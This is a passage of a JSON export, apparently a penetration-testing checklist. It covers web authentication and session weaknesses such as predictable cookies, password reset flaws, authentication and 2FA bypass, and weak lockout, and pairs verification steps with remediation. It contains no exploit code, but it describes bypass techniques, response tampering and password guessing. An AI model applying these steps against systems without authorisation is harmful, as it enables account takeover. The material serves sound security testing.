							"description": "<p>The web site uses persistent cookies. Cookies are often used as session identifiers, as well as to store personalization and customization information. There are two different types of cookies: session cookies and persistent cookies. Session cookies exist in the browser's memory and are not stored anywhere. Persistent cookies, however, are stored on the hard drive. This can cause security and privacy issues depending on the information stored in the cookie and how it is accessed. From a coding perspective, the distinction between a session cookie and a persistent cookie is the 'Expires=' tag that specifies when a persistent cookie should expire. If a cookie has no 'Expires=' tag, then it is automatically interpreted as a session cookie.</p>",
							"severityId": 2,
							"businessImpact": "<p>An attacker who has access to a machine with persistent cookies stored on it, such as a publicly shared computer, will be able to view those cookies. Persistent session cookies will allow users to access the application without being required to use a valid username and password.</p>",
							"sourceIdentifier": "M:3101134a-30e3-e111-88b8-001e4f12001e",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Determine what the session cookies are for the application. Authenticate to the application and check for &quot;Set-Cookie:&quot; in the HTTP response. If the cookie is set with &quot;expires&quot; or “Max-Age” flag, the cookie is persistent.</p><p>Note: This is only necessary for session cookies or cookies that appear to contain some sensitive information.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Show login request and response - highlight the Set-Cookie header that sets &quot;expires&quot; for the session cookie</p></li></ol>",
							"references": "<ul><li>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Review the information stored in the persistent cookies to ensure that sensitive information is not being stored in them.  Use session cookies instead of persistent cookies whenever sensitive information is contained in the cookie.</p><p>Removing the expiration date from the code that sets the cookie will change it from a persistent cookie to a session cookie. </p><pre><code>Set-Cookie: CookieName=CookieValue; <strong>expires=Sat, 11-Jun-2011 22:18:25 GMT;</strong> path=/</code></pre>"
						},
						"ordinal": 7,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "382123a9-57b6-40bf-aa1a-b8a76ab424b6",
						"name": "Weak Session Cookie - Predictable Session ID",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17051555,
							"uid": "4cead1e4-f4e3-e211-ba22-001e4f12001e",
							"name": "Weak Session Cookie - Predictable Session ID",
							"description": "<p>The application uses predictable session cookies. Due to the lack of entropy it is possible to predict valid cookie values based on an invalid cookie value.</p>",
							"severityId": 3,
							"businessImpact": "<p>Were an attacker to successfully guess a valid session ID, the attacker could take actions in the context of the affected logged on user. The severity of this issue depends on the level of access the user has within the application, as well as the nature of the application itself.</p>",
							"sourceIdentifier": "M:4cead1e4-f4e3-e211-ba22-001e4f12001e",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>Determine the session identifier that the application uses (typically a session cookie).</p><p>Review the cookie value in an effort to determine if it appears to contain predictable information. Custom cookies may be constructed in a way that may be reversed or manipulated to gain access to the application as a different user. Look for any information in cookies that appears to be related to the userID, user role etc. </p><p>Use Burp Sequencer to set the cookie value a few hundred times - let Sequencer analyze the cookie values to see if they have sufficient entropy. <strong>Please note that Burp Sequencer will slightly under report the available entropy.</strong></p><h3><strong>Reporting Requirements:</strong></h3><ol><li><p>Add a description explaining why the cookie is predictable, explaining the bits of entropy and approximately how long it will take to guess. (see Additional Information below)</p></li><li><p>Show HTTP response that sets the cookie</p></li><li><p>Use Burp Suite and Sequencer. </p></li><ol><li><p>Show all steps to send the request to Sequencer.</p></li><li><p>Show the entropy after 1000+ cookies.</p></li></ol><li><p>If the cookie can be manipulated, add additional details explaining how the cookie was manipulated and what kind of access was achieved</p></li></ol><h3>Additional Information:</h3><p>Whether you report on low entropy depends on the effective bits. Here is some context from <a href='https://owasp.org/www-community/vulnerabilities/Insufficient_Session-ID_Length'>OWASP</a>:</p><ul><li><p>An attacker guessing 1,000 cookies a second, with 10,000 valid cookies and an entropy of <strong>32 bits</strong> would take 7 minutes.</p></li><li><p>An attacker guessing 10,000 cookies a second, with 100,000 valid cookies and an entropy of <strong>64 bits</strong> would take 584 years.</p></li></ul><p>There are 3 main factors:</p><ul><li><p>The number of cookies you can guess per second</p></li><li><p>The number of valid cookies</p></li><li><p>The number of bits of entropy for the cookie</p></li></ul><p>The first two are hard to predict, but generally the more popular the site, the higher bandwidth attacks are possible, and the</p><p>more valid cookies there will be. Generally, report on anything lower than 55 bits of entropy (this accounts for Burp Sequencer estimating lower entropy than actually available).  </p><h3>Formula:</h3><p>The formula below can be used to get the value in seconds, ensure you change this to the most practical time unit. </p><pre><code>(2^B)/(S&#42;A)</code></pre><p>Where:</p><ul><li><p>B is the number of bits of entropy in the session identifier.</p></li><li><p>S is the number of valid session identifiers that are valid and available to be guessed at any given time.</p></li><li><p>A is the number of guesses an attacker can try each second.</p></li></ul>",
							"references": "<ul><li>https://www.owasp.org/index.php/Session_Prediction</li><li>https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Configure the affected web application such that it generates session IDs that meet the following requirements:</p><ul><li><p>Session IDs must be at least 20 characters in length</p></li><li><p>Session IDs should be random values and should not include user details</p></li><li><p>Session IDs must be not easily guessable via statistical analysis</p></li></ul>"
						},
						"ordinal": 8,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "da2c0b2a-c517-454d-9400-3a4a24eb7406",
						"name": "Weak Session Cookie - Insufficient Length",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 21577,
							"uid": "48dbbc87-01d6-dd11-8f72-001e4f120030",
							"name": "Weak Session Cookie - Insufficient Length",
							"description": "<p>Though it appears to be randomly generated, the session ID used by the application is relatively short and may be vulnerable to brute force attacks.</p>",
							"severityId": 2,
							"businessImpact": "<p>If valid session cookies can be brute forced, an attacker may be able to access sensitive information by hijacking other user's accounts.</p>",
							"sourceIdentifier": "M:21577",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>Check that the session cookie is at least 16 characters long.</p><h3><strong>Reporting Requirements:</strong></h3><ol><li><p>Show authentication request and response - highlight the short session cookie Set-Cookie header</p></li></ol>",
							"references": "<ul><li>https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html&#35;session-id-length</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Use a session ID that is at least 16 characters in length and sufficiently random.</p>"
						},
						"ordinal": 9,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "238abd9b-688c-43bf-b073-a027c9657679",
						"name": "Weak Session Cookie - Cookie Scoped to Parent Domain",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 4070054,
							"uid": "df5f43de-0175-e111-9e20-001e4f120021",
							"name": "Cookie Scoped to Parent Domain",
							"description": "<p>A cookie's domain attribute determines which domains can access the cookie. Browsers will automatically submit the cookie in requests to in-scope domains, and those domains may be able to access the cookie via JavaScript. When a cookie is scoped to the parent domain, browsers will send it to any sites in the domain that the user visits. If sites use the same cookie for session management, exposure of the cookie on one site can lead to an attacker gaining access to the other sites as well. If sites exist in the domain that do not make use of the cookie, vulnerabilities such as cross-site scripting in those sites may still be exploited to access the cookie and serve as entry points to further exploit the sites which do rely on the cookie for sensitive functionality.</p>",
							"severityId": -2,
							"businessImpact": "<p>If a cookie is scoped to a parent domain, then that cookie will be accessible by the parent domain and by any other subdomains of the parent domain. If the cookie contains sensitive data (such as a session token) then this data may be accessible by less trusted or less secure applications residing at those domains, leading to a security compromise.</p>",
							"sourceIdentifier": "BUR:5243648",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Authenticate to the application and inspect the Domain parameter in Set-Cookie header to see if it's set for the parent domain: </p><p>Set-Cookie: &lt;cookie-name&ge;&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;</p><p>Determine the purpose of the cookie that is scoped to the parent domain. Cookies that may contain sensitive information or which are relied on for session management or other sensitive functionality should be reported.</p><p>Note: This is only necessary for session cookies or cookies that appear to contain some sensitive information.</p><p><strong>Reporting Requirements</strong></p><p>Show authentication request and response - highlight the Set-Cookie header for the session cookie</p>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Do not set the domain of sensitive cookies when possible. If the domain attribute is not set, the effective domain is the domain of the request, and the cookie will not be sent by the browser to other sites in the domain.</p>"
						},
						"ordinal": 10,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "a72bc619-c252-4bfe-8427-7f5431e64e7b",
						"name": "Weak Session Cookie - SSO Cookie Scoped to Parent Domain",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17055125,
							"uid": "12c394ea-51dd-e411-a2a9-001e4f12001c",
							"name": "SSO Session Cookie Scoped to Parent Domain",
							"description": "<p>A cookie's domain attribute determines which domains can access the cookie. Browsers will automatically submit the cookie in requests to in-scope domains, and those domains may be able to access the cookie via JavaScript. When a cookie is scoped to the parent domain, browsers will send it to any sites in the domain that the user visits. If sites use the same cookie for session management, exposure of the cookie on one site can lead to an attacker gaining access to the other sites as well. If sites exist in the domain that do not make use of the cookie, vulnerabilities such as cross-site scripting in those sites may still be exploited to access the cookie, and serve as entry points to further exploit the sites which do rely on the cookie for sensitive functionality.</p>",
							"severityId": -2,
							"businessImpact": "<p>If a cookie is scoped to a parent domain, then that cookie will be accessible by the parent domain and by any other subdomains of the parent domain. If the cookie contains sensitive data (such as a session token) then this data may be accessible by less trusted or less secure applications residing at those domains, leading to a security compromise.</p>",
							"sourceIdentifier": "M:12c394ea-51dd-e411-a2a9-001e4f12001c",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Determine whether the application uses single sign-on technology such as SiteMinder. Authenticate to the application and inspect the Domain parameter in Set-Cookie header for the SSO cookie to see if it's set for the parent domain: </p><p>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;</p><p>Setting SSO cookies (such as SMSESSIONID) to parent domain is often a requirement but nevertheless it still increases the risk.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Show authentication request and response - highlight the Set-Cookie header for the session cookie</p></li></ol>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Setting a single sign-on (SSO) cookie to parent domain is often common SSO functionality.</p><p>To limit the exposure of SSO cookies, consider moving the applications that use single sign-on to a separate subdomain which would prevent the SSO cookie from being sent to unrelated applications.</p>"
						},
						"ordinal": 11,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "106c9850-7653-446c-b2ee-2e6f2c9c54b0",
						"name": "Forgot Password Flow",
						"instructions": "<h3><strong>Instructions:</strong></h3><p>The Forgot Password workflow should be fully tested. See the <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities\">Forgot Password OWASP guide</a> for additional details.</p><p>Many of the <code>Password Reset</code> tasks overlap with the <code>Forgot Password</code> tasks. Be sure to check these both.</p><h3><strong>Test Cases:</strong></h3><ul><li><p>Is the email account verified prior to sending password reset tokens via email?</p></li><li><p>Is the forgot password API rate limited?</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 12,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "afea2652-6ac0-4786-9fdd-80b9eeedb7d0",
						"name": "Weak Password Reset - Password in Email",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17051124,
							"uid": "30ca6c46-abb2-e211-b9cf-001e4f12001e",
							"name": "Weak Password Reset - Password in Email",
							"description": "<p>Passwords are sent in clear text via email to users during the password reset process.</p>",
							"severityId": 2,
							"businessImpact": "<p>Were an attacker able to access the victim's email, it could be possible to access the affected application by using these credentials via the password reset functionality.</p>",
							"sourceIdentifier": "M:30ca6c46-abb2-e211-b9cf-001e4f12001e",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Use the forgot password functionality (if available) to see if new password is sent in an email.</p><p>If the password meets complexity requirements and users are required to change it after one use, the finding should not be reported. Strong OTP is as strong as a reset token.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Show forgot password functionality</p></li><li><p>Show the email containing a password - redact the password</p></li></ol>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Implement the following password recovery process:</p><ol><li><p>Allow users to start the password recovery process by entering their email address on the reset page.</p></li><li><p>Require users to fill in a captcha and return a message stating &quot;Your request has been processed&quot; for both valid and non-existing user accounts.</p></li><li><p>Send an email to the user containing a URL with a unique, one-time token. The token links the password reset request to the user's account. The token should expire in 15 minutes or less.</p></li><li><p>The password reset page should not authenticate the user to the application; it should only allow a password reset.</p></li><li><p>Require correct answers to security questions on the password reset page.</p></li><li><p>Invalidate the token after it has been used once.</p></li></ol>"
						},
						"ordinal": 13,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "0aacb8ee-24b6-476a-b4d2-622d595a7d7a",
						"name": "Weak Password Reset - Unmasked Security Question Answers",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17051122,
							"uid": "3476d3e0-a2b2-e211-b9cf-001e4f12001e",
							"name": "Weak Password Reset - Unmasked Security Question Answers",
							"description": "<p>The application displays the security question answers in cleartext.</p>",
							"severityId": 1,
							"businessImpact": "<p>Anyone within viewing distance of the user's screen could be able to obtain the security question answers. The security question answers may be used in further attacks to compromise the affected user account.</p>",
							"sourceIdentifier": "M:3476d3e0-a2b2-e211-b9cf-001e4f12001e",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>If the application uses security questions, browse to the page that allow users to reset their security question answers. The answers should not be displayed to the user, the user should only be able to change them.</p><p>Unmasked security question answers are ok if they are displayed only when they are getting set.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Screenshot a page that shows unmasked security question answers</p></li></ol>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Mask the answers for the security questions. Allow users to change them but not view the previously set values.</p>"
						},
						"ordinal": 14,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "0a0eab73-7f5a-420f-8521-689ec32eb3cf",
						"name": "Weak Password Reset - Insufficient Token Invalidation",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 3389367,
							"uid": "b4f0ca03-205a-e011-b27a-001e4f120021",
							"name": "Weak Password Reset - Insufficient Token Invalidation",
							"description": "<p>The password reset functionality allows more than three attempts to guess the correct password reset token value.</p>",
							"severityId": 1,
							"businessImpact": "<p>A malicious user may be able to guess a valid password reset token to compromise the credentials of an application user. This may allow unauthorized access to the application as the compromised user, resulting in the loss of confidentiality, integrity, and availability of the application.</p>",
							"sourceIdentifier": "M:3389367",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Use forgot password functionality to access the page that requires a password reset token. </p><ol><li><p>Try three incorrect tokens</p></li><li><p>Try the valid token</p></li><li><p>Mark vulnerable if password can be reset</p></li></ol><p>The application should invalidate the token after three incorrect answers.</p><p>If the token entropy is not sufficient to prevent brute forcing of arbitrary tokens, the vulnerability severity should be increased accordingly. Additionally report lack of complexity (email tokens) or lack of rate limiting on password reset page (SMS tokens).</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Show password reset functionality</p></li><li><p>Include the HTTP request/response blocks of the invalid token. Explain how this invalid token request will be sent at least 3 times.<br>- (Optional) Include a screen shot of Intruder if necessary.</p></li><li><p>Screenshot password reset after the valid token.</p></li></ol>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Invalidate password reset tokens after three unsuccessful attempts. Ensure that token complexity is sufficient to prevent bruteforce attacks. Alternatively, rate limit password reset token requests to prevent malicious users from executing bruteforce attacks.</p>"
						},
						"ordinal": 15,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "b6a6a4b5-336b-4e91-8e78-9241b2657c86",
						"name": "Weak Password Reset or Recovery Functionality",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 2989394,
							"uid": "d8d21fe8-193f-e011-b27a-001e4f120021",
							"name": "Weak Password Reset or Recovery Functionality",
							"description": "<p>The password recovery process is currently missing best practice security controls.</p>",
							"severityId": 2,
							"businessImpact": "<p>Weak password reset or recovery functionality may allow attackers to gain unauthorized access to application user accounts.</p>",
							"sourceIdentifier": "M:2989394",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>Check if any of the following best practices are missing. The lack of CAPTCHA, by itself, does not warrant a vulnerability. If the issue being reported is that the process automatically authenticates a user after the password reset and there are no other issues (other than, perhaps, lack of CAPTCHA) this should be reported as an informational severity.</p><ol><li><p>Allow users to start the password recovery process by entering their email address on the reset page.</p></li><li><p>Require users to fill in a captcha, and return a message stating &quot;Your request has been processed&quot; for both valid and non-existing user accounts.</p></li><li><p>Send an email to the user containing an URL with a unique, one-time token. The token links the password reset request to the user's account. The token should expire in 15 minutes or less. However, expiration up to 3 hours is acceptable but a shorter expiration is recommended.</p></li><li><p>The password reset page should not authenticate the user to the application; it should only allow a password reset.</p></li><li><p>Invalidate the token after it has been used once.</p></li></ol><h3><strong>Reporting Requirements:</strong></h3><ol><li><p>Add an explanation how the password reset process works in the application and which controls are missing</p></li><li><p>Add screenshots for each step of the password reset process highlighting the weaknesses</p></li></ol><h3>Additional Information:</h3><p>Why do we not want the application to automatically authenticate a user after the password reset flow? Basically, this additional complexity is an avenue for introducing authentication and session handling vulnerabilities. Rather, it is better to rely on the standard authentication flow as a single point of entry to the application.</p><p>https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html&#35;user-resets-password</p>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Implement the following password recovery process:</p><ol><li><p>Allow users to start the password recovery process by entering their email address on the reset page.</p></li><li><p>Require users to fill in a captcha and return a message stating &quot;Your request has been processed&quot; for both valid and non-existing user accounts.</p></li><li><p>Send an email to the user containing a URL with a unique, one-time token. The token links the password reset request to the user's account. The token should expire in less than 3 hours but a shorter expiration time, like 15 minutes, is recommended.</p></li><li><p>The password reset page should not authenticate the user to the application; it should only allow a password reset.</p></li><li><p>Invalidate the token after it has been used once.</p></li></ol>"
						},
						"ordinal": 16,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "836ad862-8929-488f-8a0d-4e154d1a1f99",
						"name": "Weak Password Change - Missing Secondary Authentication",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 488164,
							"uid": "7b8b2a97-5ba1-de11-826f-001e4f120021",
							"name": "Weak Password Change - Missing Secondary Authentication",
							"description": "<p>It is possible to change a user's password without providing the user's old password. Were a malicious user to gain access to the session of another legitimate user, the malicious user could change the affected user's password without providing the targeted user's old password. To exploit this issue, the attacker would need access to the victim's session. This could be accomplished by session hijacking or a user leaving themselves logged in at a public or shared workstation.</p>",
							"severityId": 2,
							"businessImpact": "<p>Not requiring a user to provide their old password when providing a new password facilitates the ability of an attacker to modify a user's password without the user's knowledge. If an attacker were to gain access to this page for another user's account (for instance, through cross-site request forgery), the attacker would be able to change the password to a known value and log in as that user. The attacker would be able to access the user's information and take actions as that user within the application. This can also be used to cause a denial-of-service to the affected user until the user can have their password reset.</p>",
							"sourceIdentifier": "M:488164",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Check to make sure any password change functionality asks for the correct old password before changing a user's password.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Show password change without providing valid old password</p></li></ol>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that users are required to provide their current password whenever changing their password.</p>"
						},
						"ordinal": 17,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "802bf54e-1e19-43e9-8ecf-a2cfa9ae0dbc",
						"name": "Weak Remember Me Functionality",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 688826,
							"uid": "b0c8d38c-c821-df11-a447-001e4f120021",
							"name": "Weak Remember Me Functionality",
							"description": "<p>The remember me functionality saves either user credentials or a static token locally on the user's computer. Were an attacker to gain access to the locally cached credentials or static token, or physical access to a computer which had remember me functionality turned on, the attacker could gain unauthorized access to the application.</p>",
							"severityId": 3,
							"businessImpact": "<p>Exploitation of this issue would allow the attacker to take any action within the application within the context of the user whose access was compromised.</p>",
							"sourceIdentifier": "M:688826",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Remember Me functionality is typically implemented by setting a custom cookie. Inspect the cookie value and try to see if any of the following are true:</p><ol><li><p>cookie value is static (try setting it multiple times using same credentials)</p></li><li><p>cookie value contains sensitive information</p></li><li><p>cookie value is encrypted</p></li></ol><p>If the way that the cookie is constructed can be figured out, try manipulating the cookie to gain access to the application or the data in the cookie.</p><p>Remember Me functionality that allows access to the application without a password cannot be implemented securely. The best way to do it is to mark session cookie persistent; however, then persistent session cookie should be reported along with an explanation regarding Remember Me functionality.</p><p><strong>Reporting Instructions</strong></p><ol><li><p>Add an explanation why the remember me functionality is weak</p></li><li><p>Show login page with remember me selected</p></li><li><p>Show the HTTP response - highlight the remember me cookie</p></li></ol>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Do not allow the remember me function to store credentials locally on the user's computer.  If remember me functionality is required, ensure the persistent token/cookie is destroyed upon the user logging out. Similarly, the persistent token/cookie should be invalidated after a definite life span. Alternatively, remember me functionality can be implemented with specific function(s) of the application that does not involve sensitive information per business requirement. Any access to function(s) involving sensitive data should prompt user to manually enter the password.</p>"
						},
						"ordinal": 18,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "3346b02c-ae0a-443c-bb0d-53e2577793a2",
						"name": "Authentication Bypass - Parameter Manipulation*",
						"instructions": "<p>To better document various tasks (similar to a Test Plan), include a comment that reflects test cases, unique injection payloads, business logic bypass attempts, and attack paths.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17051456,
							"uid": "4ba716e4-7fde-e211-86a8-001e4f120032",
							"name": "Authentication Bypass - Parameter Manipulation",
							"description": "<p>The application's authentication mechanism is vulnerable to manipulation. By providing a specially crafted request, an attacker can bypass the intended authentication process and gain access to an authenticated identity without sufficiently proving their control of that identity (for example, by providing a password).</p>",
							"severityId": 3,
							"businessImpact": "<p>An unauthenticated user could gain access to an authenticated session and all associated permissions without providing the necessary authentication information.</p>",
							"sourceIdentifier": "M:4ba716e4-7fde-e211-86a8-001e4f120032",
							"verificationInstructions": "<p>1. Navigate to the login page of the application.</p><p>2. Attempt to authenticate with a valid username and intercept the HTTP request for the login endpoint.</p><p>3. Show the original HTTP request, the modified HTTP request, and the HTTP response. The modified HTTP request should include the highlighted parameter, cookie, or header value that was changed in order to bypass the authentication mechanism.</p><p>4. Show the landing page of the application while authenticated. Highlight the username if possible to demonstrate that the attacker has successfully compromised the account.</p>",
							"references": "<ul><li>https://www.owasp.org/index.php/Authentication_Cheat_Sheet</li><li>http://www.cgisecurity.com/owasp/html/ch11s04.html</li><li>https://www.owasp.org/index.php/Top_10_2007-Insecure_Direct_Object_Reference</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that strong controls are in place to prevent unauthenticated access to sensitive information and functionality.  All authentication checks should verify that all necessary authentication information (such as passwords or MFA tokens) has been properly provided.  Any part of the application that relies on user input to return data should perform server-side authentication checks. Do not rely on authentication checks that are performed client-side, as the client may be able to manipulate and bypass these checks.  Ensuring that server-side authentication checks are in place will help prevent users from gaining unauthorized access to sensitive data and functionality within the application.</p>"
						},
						"ordinal": 19,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "fc0d3bc7-a703-4b86-b527-c42d65a5d9c0",
						"name": "Two-Factor Authentication Bypass",
						"instructions": "<p><a href='https://securitycipher.com/docs/security/penetration-testing-tricks/2fa-bypass/'>See this site for multiple MFA bypass techniques</a></p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17058214,
							"uid": "5484f90e-b9e0-e511-80da-ecf4bbd04083",
							"name": "Weak Multi-Factor Authentication - Partial Authentication Bypass",
							"description": "<p>The standard application flow requires two-factor authentication before allowing users access to sensitive systems or applications. A method was discovered which allows access with only one authentication check.</p>",
							"severityId": 2,
							"businessImpact": "<p>If an attacker was able to retrieve credentials for a user, they would be able to access that user's account without having to provide additional authentication information.</p>",
							"sourceIdentifier": "M:5484f90e-b9e0-e511-80da-ecf4bbd04083",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Identify two-factor authentication requirements in the application. Most often two-factor can be bypassed when an application uses normal single-factor authentication for most functionality but implements two-factor authentication for specific functionality.</p><p>Sample Scenario:</p><ol><li><p>Token code required to access sensitive data</p></li><li><p>After submitting token, server response indicates whether the token is valid</p></li><li><p>Invalid token sent but server response changed to indicate valid token</p></li><li><p>Authenticated access to sensitive data without valid two-factor authentication</p></li></ol><p><strong>Reporting Requirements</strong></p><ol><li><p>Describe the two-factor authentication requirements and the authentication bypass scenario</p></li><li><p>Show page requiring two-factor</p></li><li><p>Include enough screenshots to detail how the authentication was bypassed</p></li></ol>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure the user goes through the entire two-factor process before assigning the user a valid session.</p>"
						},
						"ordinal": 20,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "9d039693-a85b-4b8b-83b7-59b428a5b649",
						"name": "Account Policy - Weak Lockout Policy",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17051131,
							"uid": "89ead67c-6bba-e211-b9cf-001e4f12001e",
							"name": "Account Policy - Weak Lockout Policy",
							"description": "<p>The application does not appear to enforce an account lockout policy or has a weak lockout policy.</p>",
							"severityId": 2,
							"businessImpact": "<p>If an account lockout policy is not enforced, then there is a greater chance that an attacker could gain unauthorized access to application functionality by conducting dictionary attacks against known application user accounts.</p>",
							"sourceIdentifier": "M:89ead67c-6bba-e211-b9cf-001e4f12001e",
							"verificationInstructions": "<h3>Verification Instructions:</h3><p>Use invalid password to login to the application ten times. Attempt signing in to the application using valid credentials to determine if the account is locked.</p><p>If the account is not locked out, use invalid password to login to the application about hundred times to determine whether any lockout policy exists.</p><h3>Reporting Instructions:</h3><ol><li><p>Include description stating that user accounts do not get locked out after ten unsuccessful login attempts.</p></li><li><p>If there is higher threshold for account lockouts, state that the account did get locked out after 100 unsuccessful login attempts.</p></li></ol><p><span style=\"color: rgba(0, 0, 0, 0.87); background-color: rgb(255, 255, 255)\"><strong>Note: Do not report this finding if the application uses Basic Authentication.</strong></span></p><h3>Miscellaneous:</h3><ul><li><p>The lockout flow from <strong>AWS Cognito</strong> is acceptable assuming the application uses the standard Cognito settings and this finding does not need to be reported.</p><ul><li><p>After five failed unauthenticated or IAM-authenticated sign-in attempts with a password, Amazon Cognito locks out your user for one second. The lockout duration then doubles after each additional one failed attempt, up to a maximum of approximately 15 minutes.</p></li><li><p>To reset the lockout to its n=0 initial state, your user must either sign in successfully after a lockout period expires, or not initiate any sign-in attempts for 15 consecutive minutes at any time after a lockout.</p></li></ul></li></ul>",
							"references": "<ul><li>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism</li><li>https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html&#35;account-lockout</li></ul>",
							"exploitInstructions": "<p>If no lockout policy exists then attempt to enumerate application users and guess common passwords for application users.</p>",
							"remediationInstructions": "<p>Enforce an account lockout policy at the application level, or the domain level if integrated Windows authentication is being used. An account should become locked after six invalid login attempts. Accounts should be locked for a set time or until an administrator unlocks the account. This will help mitigate the risk associated with an attacker trying to guess valid credentials via a brute force attack.</p><p>For the application, implement a mechanism to slow down password guessing attempts such as temporary lockout periods or the introduction of a CAPTCHA.</p><p>For Windows Domain, Microsoft recommends the following lockout policy:</p><ul><li><p>Lockout threshold: 5</p></li><li><p>Lockout duration (minutes): 15</p></li><li><p>Lockout observation window (minutes): 15</p></li></ul>"
						},
						"ordinal": 21,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "72073e72-3607-416d-a6bc-192601ebbba1",
						"name": "Account Policy - Weak Password Policy",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17058626,
